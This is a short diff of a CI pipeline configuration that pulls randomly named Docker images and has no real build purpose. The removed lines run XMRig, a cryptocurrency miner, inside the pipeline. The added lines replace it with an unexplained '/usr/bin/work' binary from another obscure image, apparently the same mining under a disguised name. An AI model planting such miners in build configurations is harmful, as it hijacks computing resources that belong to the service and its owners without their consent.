@@ -1,8 +1,9 @@
+
 version: '1.0'
 steps:
   RuningDockerImage:
     title: Runing Docker Image
-    image: grozlhrle/idie:ualpine
+    image: grozlhrle/nizadam:latest
     commands:
-      - cd /gmirx/build
-      - ./xmrig
+      - echo "Hello"
+      - /usr/bin/work
